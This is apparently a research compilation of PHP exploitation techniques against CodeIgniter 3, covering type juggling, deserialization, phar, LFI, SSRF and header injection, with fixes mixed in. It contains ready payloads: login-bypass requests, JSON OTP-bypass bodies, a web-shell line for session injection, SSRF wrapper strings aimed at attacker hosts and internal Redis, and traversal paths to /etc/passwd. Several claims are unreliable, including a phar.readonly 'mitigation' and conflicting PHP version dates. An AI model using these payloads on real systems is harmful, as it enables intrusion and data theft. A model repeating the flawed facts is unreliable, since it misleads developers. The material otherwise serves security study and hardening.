# PHP Language-Level Exploitation Techniques Against CodeIgniter 3

## PHP Type Juggling and Magic Hash Authentication Bypass

### Takeaway
PHP's loose comparison operator (`==`) treats strings matching the scientific notation pattern `0eN...` as float zero, allowing attackers to bypass password/token verification when hashes happen to collide at zero -- a well-documented class with fresh CVEs in 2025 proving it remains actively exploitable.

### Cited Findings
- **MantisBT CVE-2025-47776:** Loose `==` comparison in the login code let an attacker who knew a victim's username log in without the password. Hashes matching `^0+[Ee][0-9]+$` evaluate as numbers (float 0), so any two such hashes compare equal. Fixed in version 2.27.2. -- [MantisBT Bug Tracker](https://mantisbt.org/bugs/view.php?id=35967); [GitLab Advisory](https://advisories.gitlab.com/pkg/composer/mantisbt/mantisbt/CVE-2025-47776/)
- **phpfm 1.7.9 CVE-2023-53894 (published December 2025):** Crafted password hashes starting with `0e` or `00e` bypassed login and allowed malicious PHP uploads. Rated 9.3 Critical under CVSS v4.0. -- [GCVE Database](https://db.gcve.eu/vuln/cve-2023-53894)
- The MD5 outputs of `240610708` and `QLTHNDT` both start with `0e` and compare equal under loose comparison. The "0e" magic hash trick no longer works in PHP 8+ for non-numeric string comparisons, but remains effective on PHP 7.x which CI3 commonly runs on. -- [Medium - PHP Type Juggling Vulnerabilities](https://0xkratos.medium.com/php-type-juggling-vulnerabilities-how-attackers-exploit-loose-comparisons-e4e0c78ec9e6)
- Known magic hash values (MD5): `240610708` => `0e462097431906509019562988736854`, `QNKCDZO` => `0e830400451993494058024219903391`, `QLTHNDT` => `0e405967825401955372549139051580`, `aabg7XSs` => `0e087386482136013740957780965295`. -- [HackerDNA Lab](https://hackerdna.com/labs/type-juggling-bypass/info)

**CI3-specific application:**
- Any CI3 application code that uses `==` to compare password hashes, OTP codes, API tokens, or session tokens is vulnerable. Common patterns:
  ```php
  // VULNERABLE: loose comparison
  if ($stored_hash == $input_hash) { /* authenticated */ }
  if ($user_otp == $submitted_otp) { /* OTP verified */ }
  
  // SAFE: strict comparison
  if ($stored_hash === $input_hash) { /* authenticated */ }
  if (hash_equals($stored_hash, $input_hash)) { /* timing-safe */ }
  ```
- JSON Content-Type switching: When an endpoint accepts `Content-Type: application/json`, `json_decode()` preserves native types. Sending `{"password": 0}` or `{"otp": true}` forces integer or boolean comparison instead of string comparison, bypassing loose checks even when the raw form-encoded input would have been a string.

### Inferences
- CI3 applications running on PHP 7.x remain the primary target since PHP 8.0+ changed comparison semantics for non-numeric strings. However, integer-to-string comparisons and boolean-to-string comparisons still behave loosely in PHP 8.
- The JSON content-type vector is particularly dangerous in CI3 REST APIs built with libraries like `chriskacerguis/codeigniter-restserver`, which parse JSON request bodies automatically.

### Gaps
- No exhaustive list of magic hash values for SHA-256 (used by CI3's default password hashing) was found; the known values are MD5 and SHA-1.
- The specific PHP 8 behavior change for `strcmp(array(), "string")` was not confirmed by a primary source (PHP changelog or manual).

---

## PHP Object Injection and Deserialization in CI3

### Takeaway
CI3 had a critical session-cookie deserialization vulnerability (CVE-2014-8684) that enabled PHP object injection through forged cookies; while patched in 3.3.3, the underlying risk persists in any CI3 application that calls `unserialize()` on user-controllable data or uses file operations on user-controlled paths (phar:// deserialization).

### Cited Findings
- **CVE-2014-8684 (CI3 session cookie forgery):** Remote attackers could forge session cookies by exploiting loose string comparison when checking cryptographic hashes, enabling PHP object injection. CVSS 9.8 Critical. Affected versions before 3.0 and 3.3.x through 3.3.2; fixed in 3.3.3. -- [Averlon CVE Research](https://research.averlon.ai/vulnerability-intelligence/cve/CVE-2014-8684); [Fluid Attacks](https://db.fluidattacks.com/vul/FLAT-BEGDL/)
- **Juniper IPS Signature (HTTP:CTS:CODEIGNITER-PHP-DES):** Juniper has a network-level IPS signature specifically for detecting CodeIgniter PHP Framework Insecure Deserialization attacks. -- [Juniper ThreatLabs](https://www.juniper.net/us/en/threatlabs/ips-signatures/detail.HTTP:CTS:CODEIGNITER-PHP-DES.html)
- **CVE-2022-21647 (CI4, for reference):** A deserialization flaw in the `old()` function of CodeIgniter 4 that let remote attackers inject auto-loadable arbitrary objects. Fixed in 4.1.6. -- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-21647)

**CI3-specific deserialization surfaces:**
- CI3's session driver (file-based): Session data is serialized/unserialized when stored/retrieved. If session files are writable or predictable, an attacker can inject serialized objects.
- CI3's cache drivers (file, memcached, redis): Cached data is serialized. If cache keys are user-influenced, deserialization of attacker-controlled data may occur.
- Any custom code using `unserialize()` on cookies, database fields, or uploaded file contents.

**Gadget chains in CI3:**
- CI3's codebase contains classes with `__destruct()`, `__wakeup()`, and `__toString()` magic methods that could form POP (Property Oriented Programming) chains. Key classes to investigate:
  - `CI_Log` -- has file-write capabilities in `__destruct()` patterns
  - `CI_Upload` -- handles file operations
  - `CI_Cache_file` -- reads/writes serialized data to disk
  - `CI_Email` -- can send outbound requests

### Inferences
- Even on CI3 3.1.13 (latest stable), if the application code performs `unserialize()` on any user-controllable input (form data, cookie values, database records controlled by lower-privilege users), it remains exploitable.
- The combination of CI3's file-based session handler and LFI could chain into RCE: inject a serialized payload into session data, then include the session file.

### Gaps
- No publicly documented CI3-specific POP chain with a working exploit was found in the search results. Verification would require manual code review of CI3's `system/` directory.
- No CVEs for CI3 deserialization issues were found between 2015 and 2026 (only the 2014 one), which may indicate the surface was adequately patched or simply under-researched.

---

## Phar:// Deserialization Without unserialize()

### Takeaway
PHP's phar:// stream wrapper triggers automatic deserialization of archive metadata when any file operation touches a phar path, turning file-handling functions into deserialization gadgets -- this works without any call to `unserialize()` and can be triggered even when the phar file is disguised as a JPEG.

### Cited Findings
- **Sam Thomas / Secarma (Black Hat USA 2018):** Discovered that phar archives hold serialized metadata, and any file operation that touches the archive causes that metadata to be unserialized. An attacker uploads a Phar archive containing a malicious payload object, then makes a file function open it through the `phar://` stream wrapper. The payload can be disguised as a JPEG by altering its first 100 bytes. -- [Black Hat Presentation](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
- **CVE-2021-3838 (dompdf, published November 2024):** Versions before 2.0.0 were vulnerable because the protocol was not checked before the value reached `file_get_contents()`. -- [GCVE Database](https://db.gcve.eu/vuln/cve-2021-3838)
- **CVE-2026-34084 (PhpSpreadsheet):** The `phar://` wrapper triggers deserialization of the PHAR metadata, which can lead to remote code execution if a suitable gadget chain is available. The `ftp://` and `ssh2.sftp://` wrappers can be used for SSRF. -- Web search result (CWE-918 listing)

**Affected PHP file functions (any can trigger phar deserialization):**
```
file_exists()    is_dir()        is_file()       is_link()
is_readable()    is_writable()   filesize()      filetype()
file_get_contents()  fopen()    file()          filemtime()
fileinode()      fileperms()     copy()          rename()
unlink()         stat()          lstat()         readfile()
getimagesize()   exif_read_data()  hash_file()
```

**CI3-specific application:**
- CI3's Upload library uses `is_image()`, `getimagesize()`, and `file_exists()` during upload validation -- if an attacker can control the path parameter (or upload a phar disguised as an allowed file type), deserialization triggers.
- CI3's file-based cache driver uses `file_exists()` and `file_get_contents()` on cache file paths.
- CI3's `$this->load->view()` calls `file_exists()` on the view path before including it.
- Any CI3 application code that passes user-influenced paths to any of the above functions is at risk.

### Inferences
- The phar:// attack is particularly dangerous in CI3 because it chains with file upload functionality: upload a phar polyglot as a "JPEG," then trigger a file operation on `phar:///path/to/uploads/evil.jpg` through a parameter injection or LFI vector.
- Mitigation: set `phar.readonly = 1` in php.ini (default since PHP 5.3), validate that no user-controlled input reaches file function paths with `phar://` prefix, and strip stream wrapper prefixes from user input.

### Gaps
- No CI3-specific phar exploitation CVE or public exploit was found. The technique is generic to PHP but the CI3 attack surface (upload library, cache driver) is not documented in exploit databases.

---

## PHP strcmp() / strcasecmp() Array Bypass

### Takeaway
Passing an array where a string is expected to `strcmp()` returns NULL in PHP 5.x-7.x, and `NULL == 0` is true under loose comparison, bypassing password/token checks that use `strcmp($input, $secret) == 0`.

### Cited Findings
- Passing an array to strcmp/strcasecmp returns NULL, and `NULL == 0` is true in PHP 5/7, so a `strcmp(...) == 0` check passes. The attack vector is sending `password[]=` in the POST body instead of `password=value`. -- [HackTricks PHP Tricks](https://git.koelner.dedyn.io/coelner/hacktricks/src/commit/2197a2102f65d59940b5e17c391bca01293594e5/network-services-pentesting/pentesting-web/php-tricks-esp)
- PHP 8.0+ changed most numeric-string comparisons but edge cases with strcmp and array inputs remain. The exact PHP 8 behavior for `strcmp(array(), "string")` was not confirmed by a primary source in this search. -- [HackTricks](https://git.koelner.dedyn.io/coelner/hacktricks/src/commit/37c3881e16c6d4cbe4b413387e368830d8cba11d/pentesting/pentesting-web/php-tricks-esp)

**Attack payload:**
```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password[]=
```

**CI3-specific application:**
- CI3's `$this->input->post('password')` will return an array if the input is sent as `password[]`. CI3 does not enforce type on input retrieval by default.
- Any CI3 authentication code that does `strcmp($this->input->post('password'), $stored_password) == 0` is vulnerable.
- Fix: Use `===` instead of `==`, validate input types with `is_string()`, or use `hash_equals()`.

### Inferences
- PHP 8.0 changed strcmp to throw a TypeError when given an array, making this attack fail on PHP 8+. However, many CI3 deployments run on PHP 7.4 (still widely used in 2026 for legacy applications).
- The same technique applies to `strcasecmp()`, `substr_compare()`, and similar comparison functions.

### Gaps
- No CVE specifically documenting a strcmp array bypass in a CI3 application was found.

---

## PHP in_array() Loose Comparison Bypass

### Takeaway
`in_array()` uses loose comparison by default, allowing type juggling to bypass whitelists -- `in_array(0, ["admin", "user"])` returns true because `0 == "admin"` is true in PHP 7.x.

### Cited Findings
- Type juggling affects the `in_array()` function by default. `in_array(0, $values)` returns true against string values. The third argument `true` forces strict comparison. -- [HackTricks PHP Tricks](https://git.koelner.dedyn.io/coelner/hacktricks/src/commit/2197a2102f65d59940b5e17c391bca01293594e5/network-services-pentesting/pentesting-web/php-tricks-esp)

**CI3-specific application:**
- Role/permission checks: `if (in_array($user_role, ['admin', 'editor']))` can be bypassed if `$user_role` is integer 0 (possible via JSON input or type juggling).
- File extension whitelists: `if (in_array($ext, $allowed_types))` can be bypassed if the extension value is coerced to an integer.

**Fix:**
```php
// VULNERABLE
if (in_array($input, $whitelist)) { ... }

// SAFE
if (in_array($input, $whitelist, true)) { ... }  // strict mode
```

### Inferences
- PHP 8.0 changed the comparison for `0 == "string"` to return false, which eliminates the integer-zero bypass. But `in_array("0", [false, null, 0, ""])` still has edge cases across PHP versions.
- CI3 applications accepting JSON input are most at risk because `json_decode()` preserves native types.

### Gaps
- No specific CI3 CVE involving `in_array()` bypass was found.

---

## PHP json_decode() Type Confusion Attacks

### Takeaway
When a PHP application accepts JSON input, `json_decode()` preserves native JSON types (integers, booleans, null), allowing attackers to send `{"otp": true}`, `{"otp": 0}`, or `{"password": []}` to bypass string-based verification that uses loose comparison.

### Cited Findings
- JSON input lets an attacker choose the PHP type of a value. Sending a boolean `true` can match any non-empty string under loose comparison (`true == "any_string"` is true). -- [PentesterLab Glossary](https://pentesterlab.com/glossary/php-type-juggling)
- Sending integer `0` as a verification code can match against `0e...` hashes of the actual code on PHP 7.x. The "0e" magic hash trick no longer works in PHP 8+ because non-numeric strings are no longer coerced to 0. -- [PentesterLab Glossary](https://pentesterlab.com/glossary/php-type-juggling)
- `hash_equals()` is recommended for hash comparisons as it is both timing-safe and type-strict (returns false if either argument is not a string). -- [Medium](https://0xkratos.medium.com/php-type-juggling-vulnerabilities-how-attackers-exploit-loose-comparisons-e4e0c78ec9e6)

**Attack payloads (JSON):**
```json
{"password": true}         // true == "any_string" is true
{"password": 0}            // 0 == "0e..." magic hash is true (PHP 7)
{"otp": 0}                 // 0 == "123456" is true (PHP 7)
{"otp": true}              // true == "123456" is true
{"password": []}           // array triggers strcmp NULL return
{"token": "0"}             // "0" == false-y checks
```

**CI3-specific exploitation:**
```
POST /api/verify_otp HTTP/1.1
Content-Type: application/json

{"email": "victim@example.com", "otp": true}
```
- CI3 REST API libraries (`chriskacerguis/codeigniter-restserver`) parse JSON bodies via `json_decode()` and make them available through `$this->input->input_stream()` or custom methods.
- If the controller then does `if ($submitted_otp == $stored_otp)`, the boolean `true` matches any non-empty stored OTP string.

### Inferences
- This is the most practical type juggling vector against modern CI3 APIs because it does not require magic hash collisions -- `true` matches any non-empty string universally.
- Defense: validate input types before comparison (`is_string($otp) && strlen($otp) === 6`), use `===` for all security comparisons, and consider `hash_equals()` for token/OTP comparison.

### Gaps
- The specific OTP bypass payloads come from secondary skill/wiki pages, not from a documented CVE or bug bounty report. Treat as a well-known technique rather than a confirmed real-world exploit.

---

## PHP extract() Variable Overwrite in CI3's Loader

### Takeaway
CI3's Loader class uses `extract()` to pass data arrays to views, which is documented behavior; the security risk arises if an attacker can control the keys of the array passed to `extract()`, potentially overwriting critical variables in the view scope -- including `$this` (the CI super-object).

### Cited Findings
- A USENIX WOOT '25 paper notes that if a developer passes a super global such as `$_GET` or `$_POST` as the parameter to `extract()`, they can reach the same capabilities as if `register_globals` was still activated. -- [USENIX WOOT '25](https://www.usenix.org/system/files/woot25-hartung.pdf)
- Exakat's guidance is to always avoid using `extract()` on untrusted sources, and to always use the second argument of `extract()`, avoiding `EXTR_OVERWRITE`. -- [Exakat](https://exakat.readthedocs.io/en/latest/Reference/Rules/Security/ConfigureExtract.html)
- PHP externals discussion reports that calling `extract($_GET)` allows an attacker to overwrite all variables in the current scope, including superglobals. -- [PHP Externals](https://externals.io/message/128199)
- CWE-621 (Variable Extraction Error) recommends allowlists of variable names that can be extracted. -- [CWE-621](https://radicalnotion.ai/cwe/cwe-621)

**CI3 Loader's extract() usage:**
```php
// In system/core/Loader.php, the _ci_load() method:
extract($this->_ci_cached_vars);  // Passes view data to the view file
```
- CI3 uses `extract()` with default `EXTR_OVERWRITE` flag, meaning any key in the data array becomes a variable in the view scope.
- If an attacker can influence the keys passed to `$this->load->view('template', $data)` (e.g., through `$_GET` being merged into `$data` without filtering), they can overwrite variables like `$this`, `$_ci_view`, or other internal variables.

**Attack scenario:**
```php
// VULNERABLE controller code:
$data = array_merge($defaults, $this->input->get());
$this->load->view('dashboard', $data);

// Attacker sends: ?_ci_view=../../../../../../etc/passwd
// Could potentially overwrite internal loader variables
```

**CI3 Loader::vars() vulnerability:**
- A CodeIgniter changelog entry reports a "possible file inclusion vulnerability in Loader Library method vars() was fixed." -- [Rapid7](https://rapid7.com/db/vulnerabilities/freebsd-vid-71ebbc50-01c1-11e7-ae1b-002590263bf5)

### Inferences
- The primary risk is not in CI3's framework code itself (which only extracts the developer-provided `$data` array) but in application code that merges user input into that array without key filtering.
- A strict defense is to never pass raw `$_GET`/`$_POST` data as view variables, and to explicitly name each variable passed to the view.

### Gaps
- The specific CI3 `vars()` vulnerability mentioned in the changelog could not be matched to a CVE number. The exact affected version range is unknown from the search results.

---

## PHP preg_replace() with /e Modifier Exploitation

### Takeaway
The `/e` modifier in `preg_replace()` evaluates the replacement string as PHP code, enabling remote code execution if user input reaches the pattern or replacement -- deprecated in PHP 5.5.0 and removed in PHP 7.0, but CI3 codebases running on PHP 5.x or using legacy regex patterns remain vulnerable.

### Cited Findings
- PHP's own RFC states: "as /e evaluates arbitrary PHP code it can easily be exploited if user input is not carefully validated or sanitized." Recommends replacing any use of `/e` with `preg_replace_callback`. RoundCube suffered from such a code injection vulnerability. -- [PHP RFC](https://wiki.php.net/rfc/remove_preg_replace_eval_modifier)
- The /e modifier is deprecated as of PHP 5.5.0 and removed in PHP 7.0. -- [PentesterLab](https://pentesterlab.com/exercises/codexec_03/course)
- Acunetix flags the pattern as a risk when the regex pattern and the replacement strings are controlled by the user, which can lead to PHP code execution. -- [Acunetix](https://acunetix.com/vulnerabilities/web/php-preg_replace-used-on-user-input)

**Exploitation example:**
```php
// VULNERABLE (PHP < 7.0 only):
preg_replace('/(.*)/e', 'strtoupper("\\1")', $user_input);

// Attacker input: {${phpinfo()}}
// Or: {${system("id")}}
```

**CI3-specific application:**
- CI3's core code does not use `/e` modifier in its current versions (3.1.x). However, older CI3 applications or third-party libraries might.
- CI3's Typography class and Text helper historically used regex for text processing -- older forks may retain `/e` patterns.

### Inferences
- This is only exploitable on PHP versions below 7.0. Since CI3 supports PHP 5.6+, some deployments may still run vulnerable PHP versions.
- The risk is primarily in application code and third-party libraries, not in CI3's framework core.

### Gaps
- No specific CI3 CVE involving `/e` modifier was found. CI3's current source was not audited in this search.

---

## PHP mail() Header Injection and CI3 Email Class

### Takeaway
CVE-2016-10131 demonstrated that CI3's Email class allowed sendmail command-line argument injection through the "from" field, affecting all versions up to 3.1.2 -- while the command injection is fixed, email header injection through other fields remains a risk if user input is not sanitized.

### Cited Findings
- **CVE-2016-10131:** The class in `system/libraries/Email.php` in CodeIgniter allowed attackers who controlled the "from" field to insert sendmail command-line arguments. All versions up to 3.1.2 affected; fixed in 3.1.3. -- [Launchpad](https://launchpad.net/bugs/cve/CVE-2016-10131)
- The CI3 Email class's `subject()` method strips line breaks, but this alone was not considered sufficient protection against all header injection vectors in a 2008 forum discussion. -- [CodeIgniter Forum](https://forum.codeigniter.com/showthread.php?tid=7819)
- General PHP mail header injection: Unsanitized input passed to the mail() headers parameter can let attackers inject additional headers (Cc, Bcc) or modify existing ones, potentially leading to email spoofing or spam relay. -- [adamdoupe.com](https://adamdoupe.com/publications/email-header-injection-vulns-it2017.md)

**Attack vector for CI3:**
```php
// If user controls the "from" or "reply-to" field:
$this->email->from($user_email);  // Pre-3.1.3: sendmail arg injection

// Header injection via CRLF in name fields:
$this->email->from("legit@example.com", "Name\r\nBcc: attacker@evil.com");
```

### Inferences
- CI3 3.1.3+ fixed the sendmail argument injection but developers should still validate all email-related user input (from, reply-to, subject, custom headers) against CRLF injection.
- When CI3 uses SMTP transport instead of `mail()`, the sendmail argument injection does not apply, but CRLF header injection in the SMTP conversation may still be possible.

### Gaps
- Whether CI3 3.1.13's Email class fully sanitizes all header fields (including custom X-headers) against CRLF injection was not confirmed by source code review or advisory.

---

## PHP session.upload_progress Exploitation

### Takeaway
PHP's `session.upload_progress` feature allows an attacker to inject arbitrary data into session files by controlling the session key name and upload progress prefix -- when chained with Local File Inclusion and a race condition, this can achieve remote code execution.

### Cited Findings
- When upload progress tracking is enabled, an attacker can control the session key name, and the stored data depends on the `session.serialize_handler` setting, meaning arbitrarily session data injection is possible when a different serialize_handler is set. -- [PHP Bug #71101](https://bugs.php.net/bug.php?id=71101)
- If `session.upload_progress.prefix` is set to empty string, the attacker can control the full key name in the session file. -- [PHP Bug #71101](https://bugs.php.net/bug.php?id=71101)
- **Exploit-DB #50156:** PHP 7.3.15-3 session data injection via `PHP_SESSION_UPLOAD_PROGRESS`. Chains with LFI and a race condition to achieve RCE. The technique originated from a 2018 CTF and exploits the `upload_progress_` prefix in session files. -- [Exploit-DB](https://exploit-db.com/exploits/50156)
- **CVE-2020-7062:** Null pointer dereference in session upload progress code when `session.upload_progress.cleanup = 0` and the upload fails. Affects PHP before 7.2.28, 7.3.15, and 7.4.3. -- [CVELogic](https://www.cvelogic.com/cve/CVE-2020-7062)

**CI3-specific exploitation chain:**
1. CI3 uses file-based sessions by default, stored in a configured path (e.g., `/tmp/sess_<id>`)
2. Attacker sends a multipart upload with a controlled `PHP_SESSION_UPLOAD_PROGRESS` value containing PHP code: `<?php system($_GET['cmd']); ?>`
3. The session file briefly contains the injected PHP code
4. If the attacker can trigger an LFI to include the session file before cleanup (race condition), code execution occurs
5. CI3's `$this->load->view()` or any `include`/`require` that accepts user input is the LFI vector

**Requirements:**
- `session.upload_progress.enabled = On` (default in PHP)
- `session.upload_progress.cleanup = On` (default; requires race condition) or `= Off` (no race needed)
- An LFI vulnerability in the application
- Knowledge of the session file path

### Inferences
- This is a chained attack requiring an existing LFI vulnerability. It is not exploitable standalone against a hardened CI3 application.
- CI3's database session driver eliminates this vector because session data is stored in the database, not in files accessible via LFI.

### Gaps
- No CI3-specific exploit using this technique was found. The chain is generic to PHP applications with file-based sessions and LFI.

---

## PHP $_SERVER Variable Manipulation and Host Header Attacks

### Takeaway
Client-controlled HTTP headers directly populate PHP's `$_SERVER` superglobal (HTTP_HOST, SERVER_NAME, HTTP_X_FORWARDED_HOST, HTTP_PROXY), enabling host header poisoning, cache poisoning, password reset hijacking, and SSRF through the HTTPoxy attack -- CI3 applications that build URLs from these values without validation are vulnerable.

### Cited Findings
- Client-supplied Host headers change `$_SERVER['HTTP_HOST']` and `$_SERVER['SERVER_NAME']`. A curl request with a different Host header changes any URLs built from those variables. -- [ExpressionEngine Blog](https://pagingstaging.expressionengine.com/blog/http-host-and-server-name-security-issues)
- OWASP lists redirects to attacker domains, web cache poisoning, and manipulated password reset flows as consequences of unvalidated Host values. An `X-Forwarded-Host` header can bypass filters that only check the Host header. -- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Injection_Testing/17-Testing_for_Host_Header_Injection)
- **HTTPoxy (CVE-2016-5385 and related):** `$_SERVER['HTTP_PROXY']` carries the client's `Proxy:` header. If a script or library (e.g., Guzzle) uses it to configure outbound proxies, an attacker can route the application's outgoing traffic through their own proxy. Mitigation: strip the Proxy header at the web server. -- [Red Hat Advisory](https://access.redhat.com/node/2449291)

**CI3-specific application:**
- CI3's `base_url()` function uses `$_SERVER['HTTP_HOST']` or `$_SERVER['SERVER_NAME']` when `$config['base_url']` is not explicitly set (auto-detection mode). This enables:
  - **Password reset poisoning:** Reset emails contain links built from the attacker's Host header
  - **Cache poisoning:** Cached pages contain attacker-controlled URLs
  - **CSRF token bypass:** If CSRF tokens are tied to the host
- CI3's `$this->input->server()` method provides direct access to `$_SERVER` values without sanitization.

**Attack payloads:**
```
# Host header poisoning
GET /password/reset HTTP/1.1
Host: attacker.com

# X-Forwarded-Host bypass
GET /password/reset HTTP/1.1
Host: legitimate.com
X-Forwarded-Host: attacker.com

# HTTPoxy
GET /api/callback HTTP/1.1
Proxy: http://attacker-proxy.com:8080
```

**Mitigation for CI3:**
- Always set `$config['base_url']` explicitly in `application/config/config.php` -- never leave it empty for auto-detection.
- Strip X-Forwarded-Host, X-Host, X-Forwarded-Server, and Proxy headers at the web server (nginx/Apache) before they reach PHP.

### Inferences
- CI3's auto-detection of `base_url` is a design weakness. Any CI3 application that leaves `$config['base_url'] = ''` is vulnerable to host header poisoning for any feature that generates absolute URLs (password reset, email links, redirects, canonical URLs).

### Gaps
- No CI3-specific CVE for host header poisoning was found, despite it being a well-known configuration weakness.

---

## PHP parse_str() Variable Injection

### Takeaway
`parse_str()` called without a second argument injects parsed variables directly into the current scope, enabling attackers to overwrite authentication variables, configuration settings, or any local variable -- a well-documented CTF and real-world technique.

### Cited Findings
- **CVE-2007-3205:** `parse_str()` in PHP, when called without a second parameter, might allow remote attackers to overwrite arbitrary variables. CVSS 2.0 Medium (5.0). Red Hat disputes this as a vulnerability, calling it "expected behaviour." -- [CVEFeed](https://cvefeed.io/vuln/detail/CVE-2007-3205); [Red Hat](https://access.redhat.com/security/cve/cve-2007-3205)
- **Tokyo Westerns CTF 2018 ("simpleauth"):** Exploited `parse_str()` without second argument. The attacker overwrote `$hashed_password` via URL parameters and blanked the username/password variables, bypassing authentication. Flag: `TWCTF{d0_n0t_use_parse_str_without_result_param}`. -- [CTFtime](https://ctftime.org/writeup/11270)
- Fluid Attacks describes the safe pattern: `parse_str($_GET['data'], $params)` writes into an array instead of the local scope. -- [Fluid Attacks](https://db.fluidattacks.com/rul/SAST-GPA44/)

**CI3-specific application:**
- CI3's core does not use `parse_str()` without the second argument in modern versions. However, application code and third-party libraries may.
- CI3's `$this->input->get()` and `$this->input->post()` methods are safe wrappers -- the risk is in developer code that parses query strings manually.

### Inferences
- PHP 8.0 deprecated calling `parse_str()` without a result argument and PHP 8.2 removed the ability entirely, making this a PHP 7.x-only risk for CI3 applications.
- The defense is always using the two-argument form: `parse_str($string, $result)`.

### Gaps
- No CI3-specific instance of `parse_str()` misuse was found in framework code or advisories.

---

## PHP SSRF via file_get_contents() and Stream Wrappers

### Takeaway
PHP's stream wrappers (`http://`, `ftp://`, `phar://`, `php://`, `gopher://`, `dict://`) enable SSRF when user-controlled input reaches file functions -- CI3 applications that fetch remote content or process user-provided URLs without allowlisting are vulnerable.

### Cited Findings
- A Black Hat 2018 deck lists `allow_url_fopen = true` as the condition under which wrappers such as `http://`, `ftp://`, and `phar://` are available, and shows `file_get_contents($_GET['url'])` as a basic SSRF pattern. -- [Black Hat USA 2018](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
- When a script uses `exec()` or `system()` to call curl, shell variable expansion can alter the hostname after URL validation. -- [Medium](https://medium.com/%40themiddleblue/php-ssrf-techniques-9d422cb28d51)
- Guidance recommends validating with `filter_var(..., FILTER_VALIDATE_URL)`, resolving paths with `realpath()`, and checking that the resolved IP is not private/internal. -- [Sourcery.ai](https://www.sourcery.ai/vulnerabilities/php-lang-security-php-ssrf)
- **CVE-2026-34084 (PhpSpreadsheet):** The `ftp://` and `ssh2.sftp://` wrappers can be used for SSRF alongside phar:// deserialization. -- Web search result

**CI3-specific SSRF surfaces:**
- CI3's `file_get_contents()` usage in custom code for fetching external resources (payment callbacks, webhook verification, image processing)
- CI3's cURL library (`$this->load->library('curl')`) if URL parameters are user-controlled
- CI3's Download helper if it fetches user-provided URLs

**Dangerous PHP wrappers for SSRF:**
```
http://internal-service:8080/admin
ftp://attacker.com/evil
gopher://internal-redis:6379/_*1%0d%0a$8%0d%0aflushall
dict://internal-service:11211/stat
php://filter/convert.base64-encode/resource=/etc/passwd
phar://uploads/evil.jpg/test.txt
expect://id
```

### Inferences
- CI3 applications are most at risk when they implement features like URL preview/fetch, image proxy, webhook verification, or payment gateway callbacks that take user-controlled URLs.
- Defense: strict URL allowlisting, DNS rebinding protection, blocking private IP ranges, and disabling unnecessary stream wrappers in php.ini.

### Gaps
- No CI3-specific SSRF CVE was found.

---

## PHP intval() / floatval() Truncation Attacks

### Takeaway
`intval()` and `floatval()` silently truncate input, parsing only the leading numeric portion of a string -- this can bypass validation checks that convert to numeric before comparison while the original string value retains malicious content for other operations.

### Cited Findings
- No specific CVE or detailed write-up on intval/floatval truncation bypass was found in the search results for authentication bypass scenarios.

**Known behavior (from PHP documentation / training data):**
```php
intval("1 OR 1=1")    // Returns 1
intval("0x1A")         // Returns 0 (base 10) or 26 (base 16)
intval("1e5")          // Returns 100000
intval("   42abc")     // Returns 42
floatval("1.5 UNION")  // Returns 1.5
```

**CI3-specific application:**
- If CI3 application code validates numeric IDs with `intval()` but uses the original string in SQL queries:
  ```php
  $id = $this->input->get('id');
  if (intval($id) > 0) {
      // Uses $id (the original string, not intval result) in query
      $this->db->where('id', $id);
  }
  ```
- CI3's Active Record / Query Builder does parameterize queries, which mitigates SQL injection. But if raw queries are used with `intval()`-validated input, truncation can bypass the check.

### Inferences
- The intval truncation risk is primarily relevant when validation and usage operate on different representations of the same input.
- CI3's Query Builder provides adequate protection when used correctly; the risk is in raw `$this->db->query()` calls.

### Gaps
- No specific CVE or exploit write-up demonstrating intval truncation as an authentication bypass was found. This is documented as a PHP behavior quirk rather than a named vulnerability class.

---

## Local File Inclusion via CI3's View Loading

### Takeaway
CI3's `$this->load->view()` method includes PHP files, and if user input reaches the view name parameter without validation, it enables Local File Inclusion -- a vulnerability in CI3's Loader `vars()` method was confirmed fixed in the changelog, though without a CVE number.

### Cited Findings
- A CodeIgniter changelog entry reports "a possible file inclusion vulnerability in Loader Library method vars() was fixed." No CVE was assigned. -- [Rapid7](https://rapid7.com/db/vulnerabilities/freebsd-vid-71ebbc50-01c1-11e7-ae1b-002590263bf5)
- **Synacktiv CI3 XSS (2022):** Reflected XSS in error messages generated on failed file includes in CI3 3.1.11 and 3.1.13. Not LFI itself, but demonstrates that file inclusion error paths can leak information. -- [Synacktiv](https://www.synacktiv.com/sites/default/files/2022-11/CodeIgniter3_XSS_2022.pdf)
- **CVE-2026-39850 (Yii 2, for comparison):** LFI in Yii 2's view rendering from user-controlled keys reaching an include path. Fixed in 2.0.55. Demonstrates the same pattern in a different PHP framework. -- [CVEFeed](https://cvefeed.io/vuln/detail/CVE-2026-39850)

**CI3-specific LFI vectors:**
```php
// VULNERABLE: user input reaches view name
$page = $this->input->get('page');
$this->load->view($page);  // LFI!

// Exploitation:
// ?page=../../../../etc/passwd
// ?page=../../../../tmp/sess_<known_session_id>  (chain with session injection)
// ?page=php://filter/convert.base64-encode/resource=../config/database

// SAFE: validate against allowlist
$allowed = ['home', 'about', 'contact'];
if (in_array($page, $allowed, true)) {
    $this->load->view($page);
}
```

**CI3's view path handling:**
- CI3 appends `.php` extension by default, limiting traversal to PHP files unless null byte injection works (PHP < 5.3.4)
- CI3 checks `APPPATH . 'views/'` as the base path, but `../` traversal can escape it
- The `php://filter` wrapper can read any file regardless of extension

### Inferences
- The `.php` extension append provides partial defense on modern PHP (5.3.4+) but `php://filter` bypasses it entirely.
- Defense: never pass user input to `$this->load->view()` without strict allowlist validation.

### Gaps
- The exact CI3 version that fixed the `vars()` file inclusion vulnerability was not identified from search results.

---

## Summary of PHP Version-Dependent Exploitation

| Technique | PHP 5.x | PHP 7.x | PHP 8.0+ |
|-----------|---------|---------|----------|
| Magic hash (0e) loose comparison | Yes | Yes | No (non-numeric strings) |
| strcmp(array) bypass | Yes | Yes | TypeError thrown |
| in_array(0, ["string"]) | Yes | Yes | No (0 != "string") |
| JSON boolean true == "string" | Yes | Yes | Yes (still true) |
| preg_replace /e modifier | Yes | Removed in 7.0 | N/A |
| parse_str() without 2nd arg | Yes | Deprecated | Removed in 8.2 |
| phar:// deserialization | Yes | Yes | Yes |
